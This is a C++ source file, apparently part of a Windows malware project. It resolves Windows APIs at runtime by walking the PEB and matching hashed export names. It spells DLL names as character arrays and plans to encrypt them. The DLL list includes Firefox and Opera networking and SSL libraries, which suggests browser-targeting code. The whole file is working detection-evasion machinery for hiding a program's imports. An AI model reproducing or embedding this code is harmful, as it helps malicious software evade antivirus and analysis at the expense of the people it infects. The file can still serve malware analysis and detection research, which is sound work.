#include "stdafx.h"
#include "..\common\DynamicCall.h"
#include "..\common\mem.h"
#include "..\common\str.h"


#define RETURN_DLL_NAME(name) return (PCHAR)DynamicCall::details::name

namespace DynamicCall
{

	/**
	 * \brief
	 * \FIXME: This must move in an elegant way, to the encrypted strings
	 * \Credits To LoadLibrary and GetProcAddress Replacements From Github
	 */
	namespace details
	{
		const static char kernel32_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
		const static char advapi32_dll[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0 };
		const static char user32_dll[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
		const static char ws2_32_dll[] = { 'w','s','2','_','3','2','.','d','l','l',0 };
		const static char winhttp_dll[] = { 'W','i','n','h','t','t','p','.','d','l','l', 0 };
		const static char ntdll_dll[] = { 'n','t','d','l','l','.','d','l','l',0 };
		const static char winsta_dll[] = { 'w','i','n','s','t','a','.','d','l','l',0 };
		const static char shell32_dll[] = { 's','h','e','l','l','3','2','.','d','l','l',0 };
		const static char wininet_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l',0 };
		const static char urlmon_dll[] = { 'u','r','l','m','o','n','.','d','l','l',0 };
		const static char nspr4_dll[] = { 'n','s','p','r','4','.','d','l','l',0 };
		const static char ssl3_dll[] = { 's','s','l','3','.','d','l','l',0 };
		const static char winmm_dll[] = { 'w','i','n','m','m','.','d','l','l',0 };
		const static char cabinet_dll[] = { 'c','a','b','i','n','e','t','.','d','l','l',0 };
		const static char opera_dll[] = { 'o','p','e','r','a','.','d','l','l',0 };
		const static char gdi32_dll[] = { 'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
		const static char gdiPlus_dll[] = { 'g','d','i','p','l','u','s','.','d','l','l', 0 };
		const static char crypt32_dll[] = { 'c','r','y','p','t','3','2','.','d','l','l',0 };
		const static char Iphlpapi_dll[] = { 'I','p','h','l','p','a','p','i','.','d','l','l',0 };
		const static char winspool_drv[] = { 'w','i','n','s','p','o','o','l','.','d','r','v',0 };
		const static char odbc32_dll[] = { 'o','d','b','c','3','2','.','d','l','l',0 };
		const static char commdlg32_dll[] = { 'c','o','m','d','l','g','3','2','.','d','l','l',0 };
		const static char psapi_dll[] = { 'p','s','a','p','i','.','d','l','l',0 };
		const static char shlwapi_dll[] = { 's','h','l','w','a','p','i','.','d','l','l',0 };
		const static char version_dll[] = { 'v','e','r','s','i','o','n','.','d','l','l',0 };
		const static char imagehelp_dll[] = { 'I','m','a','g','e','h','l','p','.','d','l','l',0 };
		const static char ole32_dll[] = { 'o','l','e','3','2','.','d','l','l',0 };
		const static char cryptDll_dll[] = "cryptdll.dll";
	}


	LP_CUSTOM_PEB GetPEB()
	{
#ifdef _M_IX86
		LP_CUSTOM_PEB PEB;
		__asm
		{
			mov eax, FS:[0x30]
			mov[PEB], eax
		}
		return PEB;
#else
		return reinterpret_cast<LP_CUSTOM_PEB>(__readgsqword(0x60));
#endif
	}

	LPSTR GetDllByName(DWORD ID)
	{
		if (ID < 0 || ID == 0)
			return nullptr;

		switch (ID)
		{
		case USE_DLL_KERNEL32:	RETURN_DLL_NAME(kernel32_dll);
		case USE_DLL_NTDLL:		RETURN_DLL_NAME(ntdll_dll);
		case USE_DLL_ADVAPI32:	RETURN_DLL_NAME(advapi32_dll);
		case USE_DLL_USER32:	RETURN_DLL_NAME(user32_dll);
		case USE_DLL_WINSOCK:	RETURN_DLL_NAME(ws2_32_dll);
		case USE_DLL_WINHTTP:	RETURN_DLL_NAME(winhttp_dll);


		default: break;
		}
		return nullptr;
	}

	HMODULE GetDllBase(DWORD hash)
	{
		LP_CUSTOM_PEB pPeb = GetPEB();
		MY_LIST_ENTRY* ListEntry;
		MY_LDR_DATA_TABLE_ENTRY* pLdrDataTableEntry;

		if (pPeb == nullptr) return nullptr;

		pLdrDataTableEntry = LP_MY_LDR_DATA_TABLE_ENTRY(pPeb->LoaderData->InMemoryOrderModuleList.Flink);
		ListEntry = pPeb->LoaderData->InMemoryOrderModuleList.Flink;

		do
		{
			if (pLdrDataTableEntry->FullDllName.Buffer == nullptr)
				continue;

			if (internal::to_hash(pLdrDataTableEntry->FullDllName.Buffer, pLdrDataTableEntry->FullDllName.Length, true) == hash)
				return HMODULE(pLdrDataTableEntry->Reserved2[0]);

			ListEntry = ListEntry->Flink;
			pLdrDataTableEntry = LP_MY_LDR_DATA_TABLE_ENTRY(ListEntry->Flink);
		} while (ListEntry != pPeb->LoaderData->InMemoryOrderModuleList.Flink);


		return nullptr;
	}

	HMODULE GetKernel32()
	{
		HMODULE hkernel = nullptr;

		if ((hkernel = GetDllBase(0x4B1FFE8E)) == nullptr)
			return nullptr;;

		return hkernel;
	}

	DWORD_PTR GetAdressOfAPI(HMODULE hModule, DWORD dwProcHash)
	{
		if (!hModule) return 0;

		size_t ImageBase = size_t(hModule);
		IMAGE_DOS_HEADER* DosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(ImageBase);
		IMAGE_NT_HEADERS* NTHEADER = reinterpret_cast<IMAGE_NT_HEADERS*>(ImageBase + DosHeader->e_lfanew);
		IMAGE_DATA_DIRECTORY* RVAExports = reinterpret_cast<IMAGE_DATA_DIRECTORY*>(&NTHEADER->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		IMAGE_EXPORT_DIRECTORY* pExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY *>(ImageBase + RVAExports->VirtualAddress);

		PDWORD RVANames = PDWORD(ImageBase + pExportDirectory->AddressOfNames);
		PWORD RVANameOrdinals = PWORD(ImageBase + pExportDirectory->AddressOfNameOrdinals);
		PDWORD RVAFunctions = PDWORD(ImageBase + pExportDirectory->AddressOfFunctions);
		DWORD currentHash = 0;
		DWORD_PTR adress = 0;

		for (DWORD i = 0; i < pExportDirectory->NumberOfNames; ++i)
		{
			LPSTR pName = LPSTR(ImageBase + DWORD_PTR(RVANames[i]));

			if (pName != nullptr)
				currentHash = internal::to_hash(pName, 0, false);

			if (currentHash == dwProcHash)
			{
				adress = (DWORD_PTR(ImageBase) + RVAFunctions[RVANameOrdinals[i]]);
				break;
			}
		}


		if (PCHAR(adress) >= PCHAR(pExportDirectory) && PCHAR(adress) < RVAExports->Size + PCHAR(pExportDirectory))
		{
			PCCH lpFuntionName = nullptr;
			PCHAR name = PCHAR(adress);
			CHAR FullDllName[MAX_PATH];

			mem::zero(FullDllName, MAX_PATH);

			lpFuntionName = str::strchr(name, '.');

			mem::memcpy(FullDllName, PCHAR(name), lpFuntionName - name);
			str::strcat(FullDllName, ".dll", lpFuntionName - name);
			lpFuntionName++;

			DWORD_PTR lpHash = internal::to_hash(lpFuntionName, 0, false);
			adress = GetProcAddressEx(FullDllName, 0, lpHash);
		}

		return adress;
	}

	DWORD_PTR GetProcAddressEx(char* FullDllName, DWORD dwModule, DWORD dwProcHash)
	{
		HMODULE Module = nullptr;
		PCHAR DllName = FullDllName;

		if (dwModule == USE_DLL_KERNEL32)
			Module = GetKernel32();

		else if (FullDllName == nullptr)
			DllName = GetDllByName(dwModule);

		if (Module == nullptr && str::strlen(DllName) > 0)
		{
			if ((Module = fpGetModuleHandleA(DllName)) == nullptr)
				Module = fpLoadLibraryA(DllName);
		}


		if (dwProcHash == 0)
			return 0x00000000;

		DWORD_PTR ret = GetAdressOfAPI(Module, dwProcHash);

		if (ret == NULL)
			return static_cast<DWORD_PTR>(0x00000000);

		return ret;
	}
}
